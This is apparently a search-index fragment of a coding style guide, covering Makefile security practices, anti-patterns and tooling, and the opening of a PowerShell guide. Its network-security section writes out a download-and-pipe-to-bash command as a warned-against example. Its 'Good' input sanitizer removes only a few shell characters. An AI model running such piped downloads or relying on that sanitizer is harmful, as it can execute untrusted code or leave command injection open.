</ul>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#input-validation-and-sanitization","title":"Input Validation and Sanitization","text":"<p>Validate all external inputs:</p> <pre><code>## Bad - No validation\nVERSION ?= $(shell git describe --tags)\ndeploy:\n docker push myapp:$(VERSION)  # \u274c What if VERSION contains malicious content?\n\n## Good - Validate version format\nVERSION ?= $(shell git describe --tags 2&gt;/dev/null)\nVERSION_REGEX := ^v[0-9]+\\.[0-9]+\\.[0-9]+$$\n\ndeploy:\n @if [ -z \"$(VERSION)\" ]; then \\\n  echo \"Error: VERSION not set\"; \\\n  exit 1; \\\n fi\n @if ! echo \"$(VERSION)\" | grep -Eq \"$(VERSION_REGEX)\"; then \\\n  echo \"Error: Invalid version format '$(VERSION)'\"; \\\n  exit 1; \\\n fi\n docker push myapp:$(VERSION)\n\n## Good - Sanitize user inputs\nsanitize = $(subst ;,,$(subst &amp;,,$(subst |,,$(1))))\n\nUSER_BRANCH ?= main\nsafe-checkout:\n @$(eval SAFE_BRANCH := $(call sanitize,$(USER_BRANCH)))\n @if ! git branch -r | grep -q \"origin/$(SAFE_BRANCH)\"; then \\\n  echo \"Error: Branch '$(SAFE_BRANCH)' does not exist\"; \\\n  exit 1; \\\n fi\n git checkout \"$(SAFE_BRANCH)\"\n</code></pre> <p>Key Points:</p> <ul> <li>Validate all external inputs (environment variables, user args)</li> <li>Use regex patterns for format validation</li> <li>Sanitize inputs to remove dangerous characters</li> <li>Check for empty or undefined variables</li> <li>Verify resources exist before using them</li> <li>Use <code>$(error)</code> for critical validation failures</li> </ul>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#dependency-security","title":"Dependency Security","text":"<p>Secure external dependencies:</p> <pre><code>## Good - Pin dependency versions\nNODEJS_VERSION := 20.10.0\nTERRAFORM_VERSION := 1.6.5\n\ninstall-node:\n wget https://nodejs.org/dist/v$(NODEJS_VERSION)/node-v$(NODEJS_VERSION)-linux-x64.tar.gz\n @echo \"$(NODE_CHECKSUM)  node-v$(NODEJS_VERSION)-linux-x64.tar.gz\" | sha256sum -c\n tar -xzf node-v$(NODEJS_VERSION)-linux-x64.tar.gz\n\n## Good - Verify package integrity\nNPM_PACKAGES := express@4.18.2 dotenv@16.3.1\n\ninstall-deps:\n npm ci  # Uses package-lock.json for reproducible installs\n npm audit --audit-level=high\n @if [ $$? -ne 0 ]; then \\\n  echo \"Security vulnerabilities found!\"; \\\n  exit 1; \\\n fi\n\n## Good - Use lock files\nbundle-install:\n @if [ ! -f Gemfile.lock ]; then \\\n  echo \"Error: Gemfile.lock not found\"; \\\n  exit 1; \\\n fi\n bundle install --frozen  # Fail if Gemfile.lock is out of date\n</code></pre> <p>Key Points:</p> <ul> <li>Pin all dependency versions</li> <li>Verify checksums for downloaded packages</li> <li>Use lock files for reproducible builds</li> <li>Run security audits (npm audit, bundle audit)</li> <li>Fail builds on high-severity vulnerabilities</li> <li>Keep dependencies updated</li> </ul>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#least-privilege-execution","title":"Least Privilege Execution","text":"<p>Run commands with minimal required privileges:</p> <pre><code>## Bad - Running as root unnecessarily\ninstall:\n sudo cp bin/myapp /usr/local/bin/  # \u274c Entire make runs as root\n\n## Good - Use sudo only when necessary\ninstall:\n @echo \"Installing binary (requires sudo)...\"\n @install -m 755 bin/myapp /tmp/myapp\n @sudo mv /tmp/myapp /usr/local/bin/myapp\n @echo \"Installation complete\"\n\n## Good - Check for required permissions\ndocker-build:\n @if ! docker ps &gt; /dev/null 2&gt;&amp;1; then \\\n  echo \"Error: Docker daemon not accessible\"; \\\n  echo \"Run: sudo usermod -aG docker $$USER\"; \\\n  exit 1; \\\n fi\n docker build -t myapp:latest .\n\n## Good - Run tests as non-root user\ntest:\n @if [ \"$$(id -u)\" = \"0\" ]; then \\\n  echo \"Warning: Running tests as root is not recommended\"; \\\n fi\n npm test\n</code></pre> <p>Key Points:</p> <ul> <li>Never run make as root unless absolutely necessary</li> <li>Use <code>sudo</code> only for specific commands that require it</li> <li>Check for required permissions before executing</li> <li>Warn when running as root</li> <li>Use service accounts with minimal permissions</li> <li>Document why elevated privileges are needed</li> </ul>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#secure-build-artifacts","title":"Secure Build Artifacts","text":"<p>Protect build outputs:</p> <pre><code>## Good - Set restrictive permissions\nARTIFACT_DIR := ./dist\nSECRETS_DIR := ./secrets\n\nbuild:\n mkdir -p \"$(ARTIFACT_DIR)\"\n go build -o \"$(ARTIFACT_DIR)/myapp\"\n chmod 755 \"$(ARTIFACT_DIR)/myapp\"\n\n## Good - Generate checksums\nrelease:\n @cd \"$(ARTIFACT_DIR)\" &amp;&amp; sha256sum * &gt; SHA256SUMS\n @gpg --armor --detach-sign \"$(ARTIFACT_DIR)/SHA256SUMS\"\n\n## Good - Don't include secrets in artifacts\npackage:\n @echo \"Packaging application...\"\n @if find \"$(ARTIFACT_DIR)\" -name \"*.key\" -o -name \"*.pem\" | grep -q .; then \\\n  echo \"Error: Secrets found in artifact directory!\"; \\\n  exit 1; \\\n fi\n tar -czf release.tar.gz -C \"$(ARTIFACT_DIR)\" .\n</code></pre> <p>Key Points:</p> <ul> <li>Set appropriate file permissions for artifacts</li> <li>Generate checksums for verification</li> <li>Sign critical artifacts with GPG</li> <li>Scan artifacts for accidentally included secrets</li> <li>Never commit build artifacts to version control</li> <li>Clean up temporary build files</li> </ul>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#audit-logging","title":"Audit Logging","text":"<p>Log security-relevant operations:</p> <pre><code>## Good - Log deployments\ndeploy:\n @echo \"AUDIT: Deployment started at $$(date)\" | tee -a deploy.log\n @echo \"AUDIT: User: $$USER\" | tee -a deploy.log\n @echo \"AUDIT: Environment: $(DEPLOY_ENV)\" | tee -a deploy.log\n ./deploy.sh \"$(DEPLOY_ENV)\"\n @echo \"AUDIT: Deployment completed at $$(date)\" | tee -a deploy.log\n\n## Good - Log errors\n.ONESHELL:\n.SHELLFLAGS = -ec\ncritical-operation:\n @echo \"Starting critical operation at $$(date)\" &gt;&gt; audit.log\n @trap 'echo \"ERROR at $$(date): $$?\" &gt;&gt; audit.log' ERR\n ./risky-operation.sh\n</code></pre> <p>Key Points:</p> <ul> <li>Log all deployments and critical operations</li> <li>Include timestamps, user, and environment</li> <li>Use <code>tee</code> to log to both console and file</li> <li>Log errors and failures</li> <li>Retain logs for compliance requirements</li> <li>Monitor logs for suspicious activity</li> </ul>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#network-security","title":"Network Security","text":"<p>Secure network operations:</p> <pre><code>## Good - Use HTTPS for downloads\ndownload-tools:\n @echo \"Downloading from trusted source...\"\n curl -sSL https://trusted-site.com/tool.sh | bash  # \u274c Still risky!\n\n## Better - Download and verify before executing\ndownload-tools-safe:\n curl -sSL -o tool.sh https://trusted-site.com/tool.sh\n @echo \"$(EXPECTED_CHECKSUM)  tool.sh\" | sha256sum -c\n chmod +x tool.sh\n ./tool.sh\n rm tool.sh\n\n## Good - Use VPN for sensitive operations\ndeploy-prod:\n @if ! ping -c 1 vpn.internal &gt; /dev/null 2&gt;&amp;1; then \\\n  echo \"Error: VPN connection required for production deployment\"; \\\n  exit 1; \\\n fi\n ssh -o StrictHostKeyChecking=yes prod-server \"deploy.sh\"\n</code></pre> <p>Key Points:</p> <ul> <li>Always use HTTPS for downloads</li> <li>Never pipe downloads directly to shell</li> <li>Verify checksums before execution</li> <li>Use VPN for production deployments</li> <li>Verify SSH host keys</li> <li>Restrict network access where possible</li> </ul>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#anti-patterns","title":"Anti-Patterns","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#avoid-spaces-instead-of-tabs","title":"\u274c Avoid: Spaces Instead of Tabs","text":"<pre><code>## Bad - Using spaces for indentation\nbuild:\n    echo \"Building...\"  # This will fail!\n\n## Good - Using tabs\nbuild:\n echo \"Building...\"\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#avoid-not-using-phony","title":"\u274c Avoid: Not Using .PHONY","text":"<pre><code>## Bad - Without .PHONY, make won't run if 'clean' file exists\nclean:\n rm -rf build/\n\n## Good - Using .PHONY\n.PHONY: clean\nclean:\n rm -rf build/\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#avoid-hardcoded-paths","title":"\u274c Avoid: Hardcoded Paths","text":"<pre><code>## Bad - Hardcoded paths\nbuild:\n gcc -o /home/user/myapp main.c\n\n## Good - Use variables\nBIN_DIR = bin\nbuild:\n gcc -o $(BIN_DIR)/myapp main.c\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#avoid-not-declaring-dependencies","title":"\u274c Avoid: Not Declaring Dependencies","text":"<pre><code>## Bad - No dependencies declared\ntest:\n go test ./...\n\n## Good - Declare dependencies\ntest: build  # test depends on build\n go test ./...\n\nbuild: $(wildcard *.go)  # build depends on Go files\n go build -o app main.go\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#avoid-silent-failures","title":"\u274c Avoid: Silent Failures","text":"<pre><code>## Bad - Errors hidden\ninstall:\n -cp config.yaml /etc/app/  # '-' prefix ignores errors\n\n## Good - Fail on errors\ninstall:\n cp config.yaml /etc/app/  # Will stop if copy fails\n chmod 644 /etc/app/config.yaml\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#avoid-not-using-for-clean-output","title":"\u274c Avoid: Not Using @ for Clean Output","text":"<pre><code>## Bad - Shows all commands (noisy output)\nbuild:\n echo \"Building application...\"\n go build -o app main.go\n echo \"Build complete!\"\n\n## Good - Use @ to hide commands\nbuild:\n @echo \"Building application...\"\n @go build -o app main.go\n @echo \"Build complete!\"\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#avoid-recursive-make-without-make","title":"\u274c Avoid: Recursive Make Without $(MAKE)","text":"<pre><code>## Bad - Direct make call\ndeploy:\n cd frontend &amp;&amp; make build  # \u274c Won't pass flags correctly\n\n## Good - Use $(MAKE) variable\ndeploy:\n $(MAKE) -C frontend build  # \u2705 Passes flags and parallel builds\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#best-practices","title":"Best Practices","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#default-target","title":"Default Target","text":"<pre><code>.DEFAULT_GOAL := help\n\nhelp:\n @echo \"Available targets: build, test, clean\"\n\nbuild:\n go build -o app main.go\n\ntest:\n go test ./...\n\nclean:\n rm -f app\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#self-documenting-makefile","title":"Self-Documenting Makefile","text":"<pre><code>.PHONY: help\n\nhelp: ## Show this help message\n @grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | \\\n  awk 'BEGIN {FS = \":.*?## \"}; {printf \"\\033[36m%-20s\\033[0m %s\\n\", $$1, $$2}'\n\nbuild: ## Build the application\n go build -o app main.go\n\ntest: ## Run tests\n go test ./...\n\nclean: ## Clean build artifacts\n rm -f app\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#tool-configuration","title":"Tool Configuration","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#makefile-linting-with-checkmake","title":"Makefile Linting with checkmake","text":"<p>Install and use checkmake to lint Makefiles:</p> <pre><code>## Install checkmake (Go)\ngo install github.com/mrtazz/checkmake/cmd/checkmake@latest\n\n## Install checkmake (brew)\nbrew install checkmake\n\n## Lint Makefile\ncheckmake Makefile\n\n## Lint with specific rules\ncheckmake --config .checkmake Makefile\n\n## Output as JSON\ncheckmake --format=json Makefile\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#checkmake-configuration","title":".checkmake Configuration","text":"<pre><code>## .checkmake\n[minphony]\n  # Minimum percentage of PHONY targets\n  minPhonyTargets = 0.5\n\n[phonydeclared]\n  # Require .PHONY declarations\n  requirePhonyDeclarations = true\n\n[timestampexpanded]\n  # Allow timestamp expansion in targets\n  allowTimestampExpansion = false\n\n[maxbodylength]\n  # Maximum lines in target body\n  maxBodyLength = 10\n\n[minhelp]\n  # Minimum percentage of targets with help text\n  minHelpTargets = 0.3\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#editorconfig","title":"EditorConfig","text":"<pre><code>## .editorconfig\n[Makefile]\nindent_style = tab\nindent_size = 4\nend_of_line = lf\ncharset = utf-8\ntrim_trailing_whitespace = true\ninsert_final_newline = true\n\n[*.mk]\nindent_style = tab\nindent_size = 4\nend_of_line = lf\ncharset = utf-8\ntrim_trailing_whitespace = true\ninsert_final_newline = true\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#vs-code-settings","title":"VS Code Settings","text":"<pre><code>{\n  \"[makefile]\": {\n    \"editor.insertSpaces\": false,\n    \"editor.detectIndentation\": false,\n    \"editor.tabSize\": 4\n  },\n  \"files.associations\": {\n    \"Makefile*\": \"makefile\",\n    \"*.mk\": \"makefile\",\n    \"*.make\": \"makefile\"\n  },\n  \"makefile.configureOnOpen\": true,\n  \"makefile.launchConfigurations\": [\n    {\n      \"makeArgs\": [\"test\"],\n      \"makeDirectory\": \"${workspaceFolder}\"\n    }\n  ]\n}\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#pre-commit-hooks","title":"Pre-commit Hooks","text":"<pre><code>## .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-added-large-files\n\n  - repo: local\n    hooks:\n      - id: checkmake\n        name: Check Makefile\n        entry: checkmake\n        language: system\n        files: ^Makefile$|\\.mk$\n        pass_filenames: true\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#makefile-self-documentation","title":"Makefile Self-Documentation","text":"<p>Add help target to Makefile for self-documentation:</p> <pre><code>## Makefile with self-documentation\n.DEFAULT_GOAL := help\n\n.PHONY: help\nhelp: ## Show this help message\n @echo 'Usage:'\n @echo '  make [target]'\n @echo ''\n @echo 'Targets:'\n @awk 'BEGIN {FS = \":.*?## \"} /^[a-zA-Z_-]+:.*?## / \\\n  {printf \"  \\033[36m%-15s\\033[0m %s\\n\", $$1, $$2}' $(MAKEFILE_LIST)\n\n.PHONY: build\nbuild: ## Build the project\n go build -o bin/app .\n\n.PHONY: test\ntest: ## Run tests\n go test -v ./...\n\n.PHONY: clean\nclean: ## Clean build artifacts\n rm -rf bin/\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#makefile-testing-with-bats","title":"Makefile Testing with BATS","text":"<p>Test Makefile targets using BATS (Bash Automated Testing System):</p> <pre><code>#!/usr/bin/env bats\n## test/makefile.bats\n\nsetup() {\n  # Run before each test\n  export TEST_DIR=\"$(mktemp -d)\"\n}\n\nteardown() {\n  # Run after each test\n  rm -rf \"$TEST_DIR\"\n}\n\n@test \"make build creates binary\" {\n  run make build\n  [ \"$status\" -eq 0 ]\n  [ -f \"bin/app\" ]\n}\n\n@test \"make test runs successfully\" {\n  run make test\n  [ \"$status\" -eq 0 ]\n}\n\n@test \"make clean removes artifacts\" {\n  make build\n  make clean\n  [ ! -f \"bin/app\" ]\n}\n\n@test \"make help shows usage\" {\n  run make help\n  [ \"$status\" -eq 0 ]\n  [[ \"$output\" =~ \"Usage:\" ]]\n}\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#makefile-debugging","title":"Makefile Debugging","text":"<pre><code>## Print all variables\nmake -p\n\n## Dry run (show commands without executing)\nmake -n target\n\n## Print debugging information\nmake -d target\n\n## Trace target execution\nmake --trace target\n\n## Warn about undefined variables\nmake --warn-undefined-variables target\n\n## Print database of rules\nmake -p -f /dev/null\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#makefile-include-pattern","title":"Makefile Include Pattern","text":"<p>Organize large Makefiles with includes:</p> <pre><code>## Makefile\n.DEFAULT_GOAL := all\n\n## Include sub-makefiles\ninclude makefiles/build.mk\ninclude makefiles/test.mk\ninclude makefiles/deploy.mk\n\n.PHONY: all\nall: build test\n\n## makefiles/build.mk\n.PHONY: build\nbuild:\n go build -o bin/app .\n\n## makefiles/test.mk\n.PHONY: test\ntest:\n go test -v ./...\n\n## makefiles/deploy.mk\n.PHONY: deploy\ndeploy:\n ./scripts/deploy.sh\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#makefile-validation-script","title":"Makefile Validation Script","text":"<pre><code>#!/bin/bash\n## scripts/validate-makefile.sh\n\nset -euo pipefail\n\necho \"Validating Makefile...\"\n\n## Check if Makefile exists\nif [ ! -f \"Makefile\" ]; then\n  echo \"ERROR: Makefile not found\"\n  exit 1\nfi\n\n## Check for tabs (Make requires tabs)\nif grep -P '^    [^\\t]' Makefile &gt; /dev/null; then\n  echo \"ERROR: Found spaces instead of tabs in Makefile\"\n  exit 1\nfi\n\n## Run checkmake if available\nif command -v checkmake &amp;&gt; /dev/null; then\n  checkmake Makefile\nelse\n  echo \"WARNING: checkmake not installed, skipping lint\"\nfi\n\n## Dry run to check syntax\nmake -n --dry-run &gt; /dev/null 2&gt;&amp;1 || {\n  echo \"ERROR: Makefile has syntax errors\"\n  exit 1\n}\n\necho \"\u2713 Makefile validation passed\"\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#cicd-integration","title":"CI/CD Integration","text":"<p>GitHub Actions workflow for Makefile validation:</p> <pre><code>name: Validate Makefile\n\non:\n  pull_request:\n    paths:\n      - 'Makefile'\n      - '**.mk'\n\njobs:\n  validate:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install checkmake\n        run: |\n          go install github.com/mrtazz/checkmake/cmd/checkmake@latest\n          echo \"$HOME/go/bin\" &gt;&gt; $GITHUB_PATH\n\n      - name: Lint Makefile\n        run: checkmake Makefile\n\n      - name: Validate syntax\n        run: make -n --dry-run\n\n      - name: Test help target\n        run: make help\n</code></pre>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#references","title":"References","text":"","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#official-documentation","title":"Official Documentation","text":"<ul> <li>GNU Make Manual</li> <li>Make Reference Card</li> </ul>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/makefile/#tutorials","title":"Tutorials","text":"<ul> <li>Makefile Tutorial</li> <li>Learning Make</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["makefile","make","build","automation","devops"]},{"location":"02_language_guides/powershell/","title":"PowerShell Style Guide","text":"","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#language-overview","title":"Language Overview","text":"<p>PowerShell is a cross-platform task automation solution consisting of a command-line shell, scripting language, and configuration management framework. This guide focuses on PowerShell 7+ (PowerShell Core) for cross-platform compatibility.</p>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Paradigm: Object-oriented, pipeline-based scripting</li> <li>Case Sensitivity: Case-insensitive by default</li> <li>File Extensions: <code>.ps1</code> (scripts), <code>.psm1</code> (modules), <code>.psd1</code> (manifests)</li> <li>Primary Use: System administration, automation, CI/CD, infrastructure management</li> <li>Platforms: Windows, Linux, macOS</li> </ul>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#supported-versions","title":"Supported Versions","text":"<ul> <li>PowerShell 7.2+: Long-term support (LTS) versions</li> <li>PowerShell 7.4+: Current stable version</li> </ul>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes Naming Functions <code>Verb-Noun</code> PascalCase <code>Get-UserData</code>, <code>Set-Configuration</code> Use approved verbs Variables <code>$PascalCase</code> <code>$UserName</code>, <code>$ApiUrl</code> Descriptive names Parameters <code>PascalCase</code> <code>[string]$FilePath</code> No <code>$</code> in declaration Constants <code>$UPPER_CASE</code> <code>$MAX_RETRIES</code> Uppercase for clarity Private Functions <code>Verb-Noun</code> Same as public No special prefix needed Files Scripts <code>Verb-Noun.ps1</code> <code>Deploy-Application.ps1</code> PascalCase with <code>.ps1</code> Modules <code>ModuleName.psm1</code> <code>MyUtilities.psm1</code> PascalCase with <code>.psm1</code> Manifests <code>ModuleName.psd1</code> <code>MyUtilities.psd1</code> Module metadata Formatting Indentation 4 spaces <code>if ($condition) {</code> 4 spaces per level Line Length 115 characters <code># Reasonable max</code> Keep lines readable Braces Same line opening <code>if ($x) {</code> K&amp;R style Syntax Comparison <code>-eq</code>, <code>-ne</code>, <code>-lt</code>, <code>-gt</code> <code>if ($x -eq 5)</code> Not <code>==</code>, <code>!=</code> String Quotes Single <code>'</code> or double <code>\"</code> <code>'static'</code>, <code>\"$variable\"</code> Double for interpolation Comments <code>#</code> for line, <code>&lt;# #&gt;</code> for block <code># Comment</code> Hash for comments Parameters Type Always specify <code>[string]$Path</code> Strong typing Validation Use attributes <code>[ValidateNotNullOrEmpty()]</code> Built-in validation Mandatory Mark required <code>[Parameter(Mandatory=$true)]</code> Required parameters Best Practices Error Handling Use try/catch <code>try { } catch { }</code> Structured error handling Cmdlet Binding Use <code>[CmdletBinding()]</code> Advanced functions Enable advanced features Pipeline Support pipeline <code>[Parameter(ValueFromPipeline)]</code> Accept pipeline input Write Output Use <code>Write-Output</code> Not <code>Write-Host</code> Proper output stream","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#naming-conventions","title":"Naming Conventions","text":"","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#functions-and-cmdlets","title":"Functions and Cmdlets","text":"<p>Use PascalCase with Verb-Noun pattern using approved verbs:</p> <pre><code>## Good - Approved verb + PascalCase noun\nfunction Get-UserProfile { }\nfunction Set-ServiceConfiguration { }\nfunction New-DeploymentPackage { }\nfunction Remove-TemporaryFiles { }\n\n## Bad - Unapproved verb or incorrect casing\nfunction Fetch-UserProfile { }      # Use Get, not Fetch\nfunction get-userProfile { }        # Incorrect casing\nfunction Delete-TempFiles { }       # Use Remove, not Delete\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#approved-verbs","title":"Approved Verbs","text":"<p>Use <code>Get-Verb</code> to see all approved verbs. Common categories:</p> <pre><code>## Data Operations\nGet, Set, New, Remove, Clear, Add, Copy, Move\n\n## Lifecycle\nStart, Stop, Restart, Enable, Disable, Initialize, Complete\n\n## Diagnostics\nDebug, Trace, Measure, Test, Watch, Confirm\n\n## Communication\nSend, Receive, Read, Write, Invoke, Connect, Disconnect\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#variables","title":"Variables","text":"<p>Use PascalCase for variables:</p> <pre><code>## Good\n$UserName = \"john.doe\"\n$ServiceEndpoint = \"https://api.example.com\"\n$MaxRetryCount = 3\n\n## Bad - Incorrect casing\n$username = \"john.doe\"\n$service_endpoint = \"https://api.example.com\"\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#constants-and-configuration","title":"Constants and Configuration","text":"<p>Use UPPER_SNAKE_CASE for constants:</p> <pre><code>## Good\n$MAX_TIMEOUT_SECONDS = 300\n$DEFAULT_API_VERSION = \"v1\"\n$LOG_FILE_PATH = \"/var/log/app.log\"\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#function-structure","title":"Function Structure","text":"","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#basic-function","title":"Basic Function","text":"<pre><code>function Get-UserProfile {\n    &lt;#\n    .SYNOPSIS\n    Retrieves user profile information from Active Directory.\n\n    .DESCRIPTION\n    Queries Active Directory for detailed user profile information including\n    display name, email, department, and manager.\n\n    .PARAMETER UserName\n    The SAM account name of the user to query.\n\n    .PARAMETER IncludeManager\n    Include manager information in the output.\n\n    .EXAMPLE\n    Get-UserProfile -UserName \"jdoe\"\n\n    .EXAMPLE\n    Get-UserProfile -UserName \"jdoe\" -IncludeManager\n\n    .OUTPUTS\n    PSCustomObject with user profile properties.\n\n    .NOTES\n    Requires Active Directory PowerShell module.\n    #&gt;\n    [CmdletBinding()]\n    param(\n        [Parameter(Mandatory = $true, Position = 0)]\n        [ValidateNotNullOrEmpty()]\n        [string]$UserName,\n\n        [Parameter(Mandatory = $false)]\n        [switch]$IncludeManager\n    )\n\n    begin {\n        Write-Verbose \"Starting user profile retrieval for: $UserName\"\n    }\n\n    process {\n        try {\n            $User = Get-ADUser -Identity $UserName -Properties DisplayName, EmailAddress, Department, Manager\n\n            $Profile = [PSCustomObject]@{\n                UserName    = $User.SamAccountName\n                DisplayName = $User.DisplayName\n                Email       = $User.EmailAddress\n                Department  = $User.Department\n            }\n\n            if ($IncludeManager -and $User.Manager) {\n                $Manager = Get-ADUser -Identity $User.Manager -Properties DisplayName\n                $Profile | Add-Member -MemberType NoteProperty -Name Manager -Value $Manager.DisplayName\n            }\n\n            return $Profile\n        }\n        catch {\n            Write-Error \"Failed to retrieve user profile for '$UserName': $_\"\n            throw\n        }\n    }\n\n    end {\n        Write-Verbose \"User profile retrieval completed\"\n    }\n}\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#advanced-function-with-pipeline-support","title":"Advanced Function with Pipeline Support","text":"<pre><code>function Set-ServiceConfiguration {\n    [CmdletBinding(SupportsShouldProcess = $true, ConfirmImpact = 'Medium')]\n    param(\n        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]\n        [string[]]$ServiceName,\n\n        [Parameter(Mandatory = $true)]\n        [ValidateSet('Running', 'Stopped', 'Paused')]\n        [string]$DesiredState,\n\n        [Parameter(Mandatory = $false)]\n        [ValidateSet('Automatic', 'Manual', 'Disabled')]\n        [string]$StartupType\n    )\n\n    begin {\n        Write-Verbose \"Configuring services with desired state: $DesiredState\"\n        $Results = @()\n    }\n\n    process {\n        foreach ($Service in $ServiceName) {\n            if ($PSCmdlet.ShouldProcess($Service, \"Set configuration\")) {\n                try {\n                    $ServiceObj = Get-Service -Name $Service -ErrorAction Stop\n\n                    # Set startup type if specified\n                    if ($PSBoundParameters.ContainsKey('StartupType')) {\n                        Set-Service -Name $Service -StartupType $StartupType\n                        Write-Verbose \"Set startup type to '$StartupType' for service: $Service\"\n                    }\n\n                    # Set desired state\n                    switch ($DesiredState) {\n                        'Running' { Start-Service -Name $Service }\n                        'Stopped' { Stop-Service -Name $Service }\n                        'Paused'  { Suspend-Service -Name $Service }\n                    }\n\n                    $Results += [PSCustomObject]@{\n                        ServiceName = $Service\n                        Status      = (Get-Service -Name $Service).Status\n                        StartupType = (Get-Service -Name $Service).StartType\n                        Success     = $true\n                    }\n                }\n                catch {\n                    Write-Error \"Failed to configure service '$Service': $_\"\n                    $Results += [PSCustomObject]@{\n                        ServiceName = $Service\n                        Status      = $null\n                        StartupType = $null\n                        Success     = $false\n                    }\n                }\n            }\n        }\n    }\n\n    end {\n        return $Results\n    }\n}\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#parameters-and-validation","title":"Parameters and Validation","text":"","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#parameter-attributes","title":"Parameter Attributes","text":"<pre><code>function New-UserAccount {\n    [CmdletBinding()]\n    param(\n        # Mandatory parameter with validation\n        [Parameter(Mandatory = $true, Position = 0)]\n        [ValidateNotNullOrEmpty()]\n        [ValidateLength(3, 20)]\n        [string]$UserName,\n\n        # Email validation\n        [Parameter(Mandatory = $true)]\n        [ValidatePattern('^[\\w-\\.]+@([\\w-]+\\.)+[\\w-]{2,4}$')]\n        [string]$Email,\n\n        # Range validation\n        [Parameter(Mandatory = $false)]\n        [ValidateRange(1, 120)]\n        [int]$Age = 18,\n\n        # Set validation\n        [Parameter(Mandatory = $false)]\n        [ValidateSet('Admin', 'User', 'Guest')]\n        [string]$Role = 'User',\n\n        # Script validation\n        [Parameter(Mandatory = $false)]\n        [ValidateScript({ Test-Path $_ -PathType Container })]\n        [string]$HomeDirectory,\n\n        # Count validation\n        [Parameter(Mandatory = $false)]\n        [ValidateCount(1, 5)]\n        [string[]]$Groups\n    )\n\n    # Function implementation\n}\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#parameter-sets","title":"Parameter Sets","text":"<pre><code>function Get-LogData {\n    [CmdletBinding(DefaultParameterSetName = 'ByDate')]\n    param(\n        # ByDate parameter set\n        [Parameter(Mandatory = $true, ParameterSetName = 'ByDate')]\n        [datetime]$StartDate,\n\n        [Parameter(Mandatory = $true, ParameterSetName = 'ByDate')]\n        [datetime]$EndDate,\n\n        # ByCount parameter set\n        